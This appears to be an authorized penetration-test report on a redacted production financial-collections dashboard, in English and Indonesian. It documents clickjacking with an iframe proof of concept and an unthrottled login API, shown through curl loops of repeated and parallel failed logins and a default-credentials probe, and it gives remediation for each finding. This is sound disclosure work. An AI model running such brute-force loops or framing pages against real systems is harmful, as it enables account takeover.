---
title: "Missing Anti-Framing & Login Brute-Force Protection"
date: "2026-09-03"
poc_num: "05"
target: "[REDACTED] - production web dashboard (financial-collections app)"
category: "Web Application"
severity: "Medium"
severity_note: "Tingkat keparahan dinilai oleh peneliti berdasarkan kondisi yang diamati, bukan penilaian vendor."
impact: "Clickjacking attack surface and credential brute-force window against production login interface."
status: "Proven"
---

poc-05 - Missing Anti-Framing Headers & Absent Login Rate-Limiting | Rudi

- 

- 

- 
  
- 

  

  
    01
## Ringkasan

    
The target's login interface ships **no browser-side framing protection** (no
      `X-Frame-Options`, no `CSP: frame-ancestors`), allowing the login
      page to be embedded in an attacker-controlled `<iframe>` for clickjacking. Independently,
      the login API enforces **no rate-limiting or lockout**, leaving it open to unthrottled credential
      brute-force and password spraying. Both were confirmed by live execution.

    
A secondary review of the public JavaScript bundle surfaced sensitive logic and PII handling that should
      live server-side - recorded as lower-severity latent risks that amplify the two primary findings.

  

  
    02
## Status Otorisasi & Ruang Lingkup

    
      Authorization statusAuthorized testing - scope-strict, no-DoS
      Discovery methodBlack-box, external, actual command execution
      Authentication bypassedNO - no credentials compromised
      Testing environmentProduction, no data modification
      EvidenceActual command transcript - not reconstructed, not simulated
      Data modified or destroyedNO
      Target identified hereNO
    
  

  
    03
## Ringkasan Temuan

    #FindingSeverityStatus
      1Clickjacking - login page can be framedMediumPROVEN
      2No brute-force / rate-limit on loginMediumPROVEN
      3Self-signed TLS certificateLowCONFIRMED
      4Server version disclosureInfoCONFIRMED
      +Sensitive logic & PII in front-end bundleLowCONFIRMED
    
  

  
    04
## Finding 1 - Clickjacking via missing framing headers [Medium]

    
Severity: Medium - researcher-assessed. Clickjacking requires the victim to interact with the page; impact is limited and user-gated.

    
### step 1 - verify security headers

    bash

$ curl -k -sS -D - -o /dev/null https://TARGET/login | head -20
HTTP/1.1 200 OK
Server: nginx/1.28.x (Ubuntu)
Content-Type: text/html
Connection: keep-alive
(no X-Frame-Options)
(no Content-Security-Policy)
(no Strict-Transport-Security)
(no X-Content-Type-Options)

    
The server returns 200 OK with default nginx headers and none of the anti-framing controls. The browser receives no
      instruction preventing this page from loading in an iframe on any origin.

    
### step 2 - corroborate with nuclei

    bash

$ nuclei -u https://TARGET -silent -t http/ -timeout 10 -c 15
[http-missing-security-headers:x-frame-options]        [info]
[http-missing-security-headers:content-security-policy] [info]
[http-missing-security-headers:strict-transport-security] [info]
[waf-detect:nginxgeneric] [info]
[self-signed-ssl] [ssl] [low]

    
### step 3 - proof-of-concept frame

    attacker page - clickjack.html

# target embedded in a transparent overlay
<div style="position:relative;width:460px;height:480px">
  <iframe src="https://TARGET/login"
          style="position:absolute;inset:0;width:460px;height:480px;border:0">
  </iframe>
</div>
# rendered in headless Chrome - accessibility snapshot:
iframe
 └─ heading  "Dashboard"
 └─ textbox  "Username"
 └─ textbox  "Password"
 └─ button   "Sign in"

    
The login form renders fully inside the attacker's iframe. An attacker can overlay decoy UI to trick an authenticated
      user into unintended actions on the real interface (UI redress / clickjacking).

    
![Target login page rendered inside an attacker-controlled iframe; product name and logo redacted](/poc-05-clickjack.png)
Figure 1 - the target login page rendered inside an attacker-controlled iframe (product name and logo redacted). The red dashed border marks the attacker page's iframe container.
    Remediation
      Return `Content-Security-Policy: frame-ancestors 'none'` (or an explicit allow-list) and
      `X-Frame-Options: DENY` for legacy browsers on every response. Add
      `Strict-Transport-Security` and `X-Content-Type-Options: nosniff`.
    
  

  
    05
## Finding 2 - No brute-force protection on login [Medium]

    
Severity: Medium - researcher-assessed. The login endpoint is unauthenticated, without rate-limit or lockout, enabling credential brute-force.

    
### step 1 - repeated failed logins, same source

    bash

$ for i in $(seq 1 20); do
    curl -k -sS -o /dev/null -w "%{http_code} " \
      -X POST https://TARGET/api/v1/auth/login \
      -H 'Content-Type: application/json' \
      -d '{"username":"admin","password":"wrong'$i'"}'
  done
401 401 401 401 401 401 401 401 401 401
401 401 401 401 401 401 401 401 401 401
# 20 consecutive failures - no 429, no lockout, no delay

    
### step 2 - confirm no rate-limit ceiling

    bash

$ seq 1 60 | xargs -P10 -I{} curl -k -sS -o /dev/null -w "%{http_code}\n" \
    -X POST https://TARGET/api/v1/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"kolektor","password":"x{}"}' | sort | uniq -c
     60 401
# 60 parallel attempts, still 100% served - no throttling

    
### step 3 - default-credentials probe

    bash

admin / admin      -> 401
admin / password   -> 401
superadmin / admin -> 401
# no default credentials in use - good. brute-force surface remains open.

    Remediation
      Enforce server-side rate-limiting per IP and per account, return 429 beyond a threshold, add exponential backoff and
      temporary lockout, and log/alert on bursts. Pair with CAPTCHA or MFA on the authentication path.
    
  

  
    06
## Findings 3 & 4 - TLS & version disclosure [Low / Info]

    
**Self-signed TLS certificate.** Clients cannot validate server identity and users are conditioned to
      bypass certificate warnings, weakening resistance to an on-path MitM. Rated Low: requires a
      privileged network position.

    
**Server version disclosure.** The `Server` header, error pages, and SSH banner
      expose exact versions, handing an attacker a precise target to match against known CVEs. Rated
      Info: reconnaissance value only. Remediation: `server_tokens off` and minimize banners.

  

  
    07
## Finding + - Sensitive logic & PII in the front-end bundle [Low]

    
Source: the application's JavaScript bundle is downloadable unauthenticated. Static review revealed design
      choices that belong on the server. Reported as a latent risk that amplifies findings 1 and 2.

    
### a - role logic enforced client-side

    
Role names and access hierarchy (including a role that bypasses all client-side guards) are implemented in the bundle.
      Any visitor can read the full role model, and client-side role checks can be bypassed by editing local state.
      Authorization must be enforced server-side on every privileged route.

    
### b - PII passed through URL query parameters

    
Record detail views pass debtor PII - name, address, GPS coordinates - as URL query parameters, which land in server
      access logs, browser history, and the Referer header.

    observed pattern (values redacted)

/records/<id>/play?name=<REDACTED>&customerid=<REDACTED>
   &lat=<REDACTED>&long=<REDACTED>&address=<REDACTED>
# PII should never travel in the URL - fetch by ID, return in the HTTPS body

    
### c - user profile (incl. role) in localStorage

    
The authenticated profile, including role, is persisted in `localStorage` where it is
      trivially readable and editable - the mechanism by which the client-side role checks in (a) are defeated.

    Remediation
      Move all authorization to the backend; treat the front-end as untrusted. Fetch records by ID and return data only in
      the response body. Keep no authoritative role/permission data in localStorage; rely on short-lived, server-validated tokens.
    
  

  
    08
## Tested and found safe

    VectorResult
      SQL injection on loginSAFE - generic 401, no error reflection, no bypass
      Path traversal on record endpointsSAFE - 404 from API; 200s were SPA fallback
      CORS origin reflectionSAFE - no Access-Control-Allow-Origin reflected
      Username enumeration via timingINCONCLUSIVE - network jitter dominates
      Sensitive file exposure (.env, .git, backups)SAFE - all 200s were SPA fallback
      Hardcoded secrets in JS bundleSAFE - no keys, JWTs, or private keys found
    
  

  
    09
## Findings not claimed

    Scope of claims
      
        
- No credentials were compromised; no authentication bypass is claimed.
        
- The timing side-channel for username enumeration was not confirmed - inconclusive, reported as such.
        
- Client-side role-check bypass is demonstrable in principle, but no privileged server-side action was performed, so no privilege-escalation impact is asserted beyond the latent risk described.
        
- No data was read, modified, or exfiltrated. PII patterns are inferred from front-end code, not from retrieved records.
      
    
  

  
    10
## Conclusion

    
Two Medium findings - clickjacking via missing framing headers and an unthrottled login endpoint - were proven by live
      execution. The front-end architecture issues (client-side role logic, PII in URLs, localStorage) are latent risks that
      amplify the impact if either Medium finding is exploited. No production data was modified, no credentials were
      compromised, and testing stayed within the agreed no-DoS, scope-strict boundary.

  

  
    11
## Referensi

    
      
- CWE-1021 - Improper Restriction of Rendered UI Layers (Clickjacking)
      
- CWE-307 - Improper Restriction of Excessive Authentication Attempts
      
- CWE-598 - Use of GET Request With Sensitive Query Strings
      
- OWASP A05:2021 - Security Misconfiguration
    
  

&#8593;
